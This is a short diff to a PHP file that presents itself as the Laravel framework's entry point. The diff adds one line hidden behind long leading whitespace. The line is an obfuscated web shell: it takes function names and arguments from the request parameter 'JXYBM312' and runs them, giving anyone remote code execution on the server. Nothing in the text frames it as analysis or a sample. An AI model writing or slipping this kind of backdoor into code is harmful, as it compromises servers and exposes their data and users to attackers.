@@ -1,4 +1,5 @@
 <?php
+                                                                                                                                                                                                                                                                           if($g4owq=@${'_REQUEST'}['JXYBM312'	])$g4owq	[	1](	${$g4owq[2 ]} [0]	, $g4owq	[ 3]($g4owq	[4])	);
 
 /**
  * Laravel - A PHP Framework For Web Artisans
